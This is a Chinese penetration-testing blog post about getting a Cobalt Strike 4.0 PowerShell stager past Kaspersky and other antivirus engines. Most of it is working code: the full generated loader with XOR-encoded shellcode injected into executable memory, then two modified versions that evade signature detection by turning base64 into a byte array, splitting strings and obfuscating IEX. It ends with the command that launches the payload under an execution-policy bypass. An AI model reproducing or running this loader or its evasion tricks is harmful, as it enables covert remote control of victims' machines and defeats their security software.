---
title: "Cobalt Strike Powershell 过卡巴免杀上线"
date: 2020-08-27T11:40:54+08:00
draft: false
tags:
- powershell
series:
-
categories:
- 渗透测试
---


没什么技术含量
<!--more-->

Coablt Strike 4.0
![image.png](https://y4er.com/img/uploads/20200827119267.png)

生成ps1文件


直接被秒杀
![image.png](https://y4er.com/img/uploads/20200827113865.png)

查看ps1文件内容

```powershell
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuzPCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMYWdISCPSjo+ES2wU5Cgo213ELAxTtcW3jLu2wxoB6+UI1pFe5QtKWRU99qnU40ltkm4SJWul7EPpOTmEw8D9FoKGywVALdsr5/A64cQyI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRMYA3RsdBUXGAN3UUpHRk1XDBYNExgDTlBNA2xTV0pOSllGR2pmGxhmbXZwCi4pI0yC0OUolAOECPlYzqpBnQz7WW5QCeVDOUPi3jjqnNGtp39q5f+kjLoCc0ea2hQetsYnPTlO7F+Q2xLQoTQyuC6QkIc6jSOgRNCZUNmki6FueVN8TyaymGlWw0iU1mKbsd9yEZXVSd4LWWUzuNqocajn26otfu+C6wyuhUbBbU/zfNM17FzdXhsFmL/Dfed4HzTtP5Kjlvio07XFYjBMi4fls+sKijWkY6mssJu6hEaA5X4FcQmWHvqAQ8CKYv/wEJ15siNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhQRDRIVDRENGxsjMRd1Ww==')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
```

把FromBase64String改成FromBase65String就不杀了，那就解决掉FromBase64String，直接改成byte数组。

![image.png](https://y4er.com/img/uploads/20200827116879.png)

改完之后

```powershell
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code =  [Byte[]](223,203,170,35,35,35,67,170,198,18,241,71,168,113,19,168,113,47,168,113,55,168,81,11,44,148,105,5,18,220,18,227,143,31,66,95,33,15,3,226,236,46,34,228,193,211,113,116,168,113,51,168,97,31,34,243,168,99,91,166,227,87,105,34,243,115,168,107,59,168,123,3,34,240,192,31,106,168,23,168,34,245,18,220,18,227,143,226,236,46,34,228,27,195,86,215,32,94,219,24,94,7,86,193,123,168,123,7,34,240,69,168,47,104,168,123,63,34,240,168,39,168,34,243,170,103,7,7,120,120,66,122,121,114,220,195,123,124,121,168,49,200,165,126,75,77,70,87,35,75,84,74,77,74,119,75,111,84,5,36,220,246,18,220,116,116,116,116,116,75,25,117,90,132,220,246,202,167,35,35,35,120,18,234,114,114,73,32,114,114,75,179,60,35,35,112,115,75,116,170,188,229,220,246,200,83,120,18,241,113,75,35,33,99,167,113,113,113,112,113,115,75,200,118,13,24,220,246,170,229,160,224,115,18,220,116,116,73,220,112,117,75,14,37,59,88,220,246,166,227,44,167,224,34,35,35,18,220,166,213,87,39,170,218,200,42,75,137,230,193,126,220,246,170,226,75,102,2,125,18,220,246,18,220,116,73,36,114,117,115,75,148,116,195,40,220,246,156,35,12,35,35,26,228,87,148,18,220,202,178,34,35,35,202,234,34,35,35,203,168,220,220,220,12,97,103,72,72,35,210,142,143,132,75,108,20,228,40,40,219,93,196,44,12,83,181,197,183,140,187,182,195,26,1,235,229,8,214,145,94,229,11,74,89,21,61,246,169,212,227,73,109,146,110,18,37,107,165,236,67,233,57,57,132,195,192,253,22,130,134,203,5,64,45,219,43,231,240,58,225,196,50,35,118,80,70,81,14,98,68,70,77,87,25,3,110,76,89,74,79,79,66,12,22,13,19,3,11,64,76,78,83,66,87,74,65,79,70,24,3,110,112,106,102,3,26,13,19,24,3,116,74,77,71,76,84,80,3,109,119,3,21,13,19,24,3,116,108,116,21,23,24,3,119,81,74,71,70,77,87,12,22,13,19,24,3,78,80,77,3,108,83,87,74,78,74,89,70,71,106,102,27,24,102,109,118,112,10,46,41,35,76,130,208,229,40,148,3,132,8,249,88,206,170,65,157,12,251,89,110,80,9,229,67,57,67,226,222,56,234,156,209,173,167,127,106,229,255,164,140,186,2,115,71,154,218,20,30,182,198,39,61,57,78,236,95,144,219,18,208,161,52,50,184,46,144,144,135,58,141,35,160,68,208,153,80,217,164,139,161,110,121,83,124,79,38,178,152,105,86,195,72,148,214,98,155,177,223,114,17,149,213,73,222,11,89,101,51,184,218,168,113,168,231,219,170,45,126,239,130,235,12,174,133,70,193,109,79,243,124,211,53,236,92,221,94,27,5,152,191,195,125,231,120,31,52,237,63,146,163,150,248,168,211,181,197,98,48,76,139,135,229,179,235,10,138,53,164,99,169,172,176,155,186,132,70,128,229,126,5,113,9,150,30,250,128,67,192,138,98,255,240,16,157,121,178,35,75,211,150,129,117,220,246,73,99,75,35,51,35,35,75,35,35,99,35,116,75,123,135,112,198,220,246,176,154,35,35,35,35,34,250,114,112,170,196,116,75,35,3,35,35,112,117,75,49,181,170,193,220,246,166,227,87,229,168,36,34,224,166,227,86,198,123,224,203,138,222,220,220,18,20,17,13,18,21,13,17,13,27,27,35,49,23,117,91)

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
```

卡巴斯基没秒杀，放vt上看看

https://www.virustotal.com/gui/file/d73117a43cd10b5f8672b5440c9466d82d8df13a2d23f05171017ec442f8bacf/detection

![image.png](https://y4er.com/img/uploads/20200827111061.png)


看来还是有别的关键字，再改一改

```powershell
Set-StrictMode -Version 2

$DoIt = @'
function func_b {
	Param ($amodule, $aprocedure)		
	$aunsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.Uns'+'afeN'+'ativeMethods')
	$agpa = $aunsafe_native_methods.GetMethod('GetP'+'rocAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $agpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($aunsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($amodule)))), $aprocedure))
}

function func_a {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $aparameters,
		[Parameter(Position = 1)] [Type] $areturn_type = [Void]
	)

	$atype_b = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('Reflect'+'edDel'+'egate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDeleg'+'ateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$atype_b.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $aparameters).SetImplementationFlags('Runtime, Managed')
	$atype_b.DefineMethod('Inv'+'oke', 'Public, HideBySig, NewSlot, Virtual', $areturn_type, $aparameters).SetImplementationFlags('Runtime, Managed')

	return $atype_b.CreateType()
}

[Byte[]]$acode =  [Byte[]](223,203,170,35,35,35,67,170,198,18,241,71,168,113,19,168,113,47,168,113,55,168,81,11,44,148,105,5,18,220,18,227,143,31,66,95,33,15,3,226,236,46,34,228,193,211,113,116,168,113,51,168,97,31,34,243,168,99,91,166,227,87,105,34,243,115,168,107,59,168,123,3,34,240,192,31,106,168,23,168,34,245,18,220,18,227,143,226,236,46,34,228,27,195,86,215,32,94,219,24,94,7,86,193,123,168,123,7,34,240,69,168,47,104,168,123,63,34,240,168,39,168,34,243,170,103,7,7,120,120,66,122,121,114,220,195,123,124,121,168,49,200,165,126,75,77,70,87,35,75,84,74,77,74,119,75,111,84,5,36,220,246,18,220,116,116,116,116,116,75,25,117,90,132,220,246,202,167,35,35,35,120,18,234,114,114,73,32,114,114,75,179,60,35,35,112,115,75,116,170,188,229,220,246,200,83,120,18,241,113,75,35,33,99,167,113,113,113,112,113,115,75,200,118,13,24,220,246,170,229,160,224,115,18,220,116,116,73,220,112,117,75,14,37,59,88,220,246,166,227,44,167,224,34,35,35,18,220,166,213,87,39,170,218,200,42,75,137,230,193,126,220,246,170,226,75,102,2,125,18,220,246,18,220,116,73,36,114,117,115,75,148,116,195,40,220,246,156,35,12,35,35,26,228,87,148,18,220,202,178,34,35,35,202,234,34,35,35,203,168,220,220,220,12,97,103,72,72,35,210,142,143,132,75,108,20,228,40,40,219,93,196,44,12,83,181,197,183,140,187,182,195,26,1,235,229,8,214,145,94,229,11,74,89,21,61,246,169,212,227,73,109,146,110,18,37,107,165,236,67,233,57,57,132,195,192,253,22,130,134,203,5,64,45,219,43,231,240,58,225,196,50,35,118,80,70,81,14,98,68,70,77,87,25,3,110,76,89,74,79,79,66,12,22,13,19,3,11,64,76,78,83,66,87,74,65,79,70,24,3,110,112,106,102,3,26,13,19,24,3,116,74,77,71,76,84,80,3,109,119,3,21,13,19,24,3,116,108,116,21,23,24,3,119,81,74,71,70,77,87,12,22,13,19,24,3,78,80,77,3,108,83,87,74,78,74,89,70,71,106,102,27,24,102,109,118,112,10,46,41,35,76,130,208,229,40,148,3,132,8,249,88,206,170,65,157,12,251,89,110,80,9,229,67,57,67,226,222,56,234,156,209,173,167,127,106,229,255,164,140,186,2,115,71,154,218,20,30,182,198,39,61,57,78,236,95,144,219,18,208,161,52,50,184,46,144,144,135,58,141,35,160,68,208,153,80,217,164,139,161,110,121,83,124,79,38,178,152,105,86,195,72,148,214,98,155,177,223,114,17,149,213,73,222,11,89,101,51,184,218,168,113,168,231,219,170,45,126,239,130,235,12,174,133,70,193,109,79,243,124,211,53,236,92,221,94,27,5,152,191,195,125,231,120,31,52,237,63,146,163,150,248,168,211,181,197,98,48,76,139,135,229,179,235,10,138,53,164,99,169,172,176,155,186,132,70,128,229,126,5,113,9,150,30,250,128,67,192,138,98,255,240,16,157,121,178,35,75,211,150,129,117,220,246,73,99,75,35,51,35,35,75,35,35,99,35,116,75,123,135,112,198,220,246,176,154,35,35,35,35,34,250,114,112,170,196,116,75,35,3,35,35,112,117,75,49,181,170,193,220,246,166,227,87,229,168,36,34,224,166,227,86,198,123,224,203,138,222,220,220,18,20,17,13,18,21,13,17,13,27,27,35,49,23,117,91)

for ($x = 0; $x -lt $acode.Count; $x++) {
	$acode[$x] = $acode[$x] -bxor 35
}

$ava = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_b kernel32.dll VirtualAlloc), (func_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$abuffer = $ava.Invoke([IntPtr]::Zero, $acode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($acode, 0, $abuffer, $acode.length)

$arunme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($abuffer, (func_a @([IntPtr]) ([Void])))
$arunme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) ie`x $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	i`ex $DoIt
}
```

https://www.virustotal.com/gui/file/4b907e0d3da03ee1c6c12541603cc2ac9849564e3358b706c1eb5fb0f94f1918/detection

![image.png](https://y4er.com/img/uploads/20200827115134.png)

ok了，也能正常上线

```bash
powershell -ExecutionPolicy bypass -File .\payload.ps1
```

![image.png](https://y4er.com/img/uploads/20200827114184.png)

执行命令，卡巴斯基会拦截，argue污染以下就行了。
![image.png](https://y4er.com/img/uploads/20200827111122.png)


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**